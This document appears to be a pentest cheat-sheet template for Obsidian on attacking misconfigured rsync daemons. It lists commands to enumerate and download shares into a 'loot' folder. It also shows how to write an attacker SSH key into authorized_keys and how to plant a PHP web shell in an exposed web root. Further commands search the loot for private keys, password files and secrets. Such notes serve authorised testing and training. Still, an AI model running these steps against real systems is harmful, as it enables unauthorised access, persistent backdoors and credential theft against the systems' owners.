# Rsync — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 873 -%>

> [!info] Rsync is a fast file synchronization protocol. Misconfigured rsync daemons may expose shares anonymously or with weak credentials — can allow arbitrary file read **and write**.

---

## Nmap
```bash
nmap -p<% port %> --script=rsync-list-modules <% ip %>
```

---

## List Available Modules (shares)
```bash
rsync rsync://<% ip %>:<% port %>/
```

```bash
rsync rsync://<% ip %>/
```

```bash
nmap -p<% port %> --script=rsync-list-modules <% ip %>
```

---

## Browse Module Contents
```bash
rsync rsync://<% ip %>:<% port %>/<module>/
```

```bash
# List recursively
rsync -av --list-only rsync://<% ip %>/<module>/
```

---

## Download Files / Entire Share
```bash
# Download everything from module
rsync -av rsync://<% ip %>/<module>/ ./loot/
```

```bash
# Download single file
rsync -av rsync://<% ip %>/<module>/path/to/file ./
```

```bash
# Download with authentication
rsync -av rsync://<user>@<% ip %>/<module>/ ./loot/
# (will prompt for password)
```

---

## Upload Files (if write access)
```bash
# Test write by uploading a test file
rsync -av /tmp/test.txt rsync://<% ip %>/<module>/test.txt
```

```bash
# Upload SSH key if home directory is exposed
rsync -av ~/.ssh/id_rsa.pub rsync://<% ip %>/<module>/.ssh/authorized_keys
```

```bash
# Write web shell if web root exposed
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
rsync -av /tmp/shell.php rsync://<% ip %>/<module>/shell.php
```

---

## Authenticated Rsync
```bash
rsync -av rsync://<user>@<% ip %>/<module>/ ./loot/
```

```bash
# With password in environment
RSYNC_PASSWORD='<password>' rsync -av rsync://<user>@<% ip %>/<module>/ ./loot/
```

---

## Interesting Files to Extract
```bash
# After downloading share, look for:
find ./loot -name "*.conf" -o -name "*.config" 2>/dev/null
find ./loot -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
find ./loot -name "shadow" -o -name "passwd" 2>/dev/null
find ./loot -name "*.htpasswd" -o -name ".env" 2>/dev/null
grep -r "password\|passwd\|secret\|token\|key" ./loot/ 2>/dev/null | head -50
```

---

## Config File Locations
```
/etc/rsyncd.conf          — daemon config (lists modules, auth, paths)
/etc/rsyncd.secrets       — password file for rsync auth
```

```bash
# If you can read rsyncd.conf via rsync:
rsync rsync://<% ip %>/<module>/etc/rsyncd.conf ./rsyncd.conf 2>/dev/null
cat rsyncd.conf
```

---

## Notes
